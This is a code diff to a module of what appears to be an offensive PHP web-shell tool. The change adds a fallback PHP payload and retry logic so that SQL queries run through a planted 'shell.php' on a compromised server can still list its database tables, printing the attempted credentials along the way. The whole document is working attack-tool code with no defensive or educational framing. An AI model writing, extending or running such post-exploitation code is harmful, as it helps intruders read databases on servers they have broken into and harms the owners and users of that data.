@@ -18,15 +18,23 @@ class Query(Module):
     '''
     
     vectors = VectorList([
-            Vector('shell.php', 'php_fetch', """
-ini_set('mysql.connect_timeout',1);
+            Vector('shell.php', 'php_fetch', [ """
 $c="%s"; $q="%s"; $f="%s";
 if(@$c("%s","%s","%s")){
 $result = $q("%s");
 while (list($table) = $f($result)) {
 echo $table."\n";
 }
-}""")
+}""", """
+$c="%s"; $q="%s"; $f="%s"; $h="%s"; $u="%s"; $p="%s";
+$result = $q("%s");
+if($result) {
+print("[!] Error connecting to '$u:$p@$h', trying with default user@localhost:\n");
+while (list($table) = $f($result)) {
+echo $table."\n";
+}
+}
+"""])
             ])
 
     params = ParametersList('Execute SQL query', vectors,
@@ -65,17 +73,28 @@ echo $table."\n";
     def __execute_payload(self, vector, parameters):
         
         payload = self.__prepare_payload(vector, parameters) 
-        
         response = self.modhandler.load(vector.interpreter).run({ 0: payload })
-        if response:
+        
+        
+        if not response:
+            
+            payload = self.__prepare_payload(vector, parameters, 1) 
+            response = self.modhandler.load(vector.interpreter).run({ 0: payload })
+            
+            
+            if response:
+                return response
+        else:
             return response
+        
         return None
+    
+    
 
-
-    def __prepare_payload( self, vector, parameters ):
-
-        if vector.payloads[0].count( '%s' ) == len(parameters):
-            return vector.payloads[0] % tuple(parameters)
+    def __prepare_payload( self, vector, parameters, payloadnum = 0 ):
+        
+        if vector.payloads[payloadnum].count( '%s' ) == len(parameters):
+            return vector.payloads[payloadnum] % tuple(parameters)
         else:
             raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
         
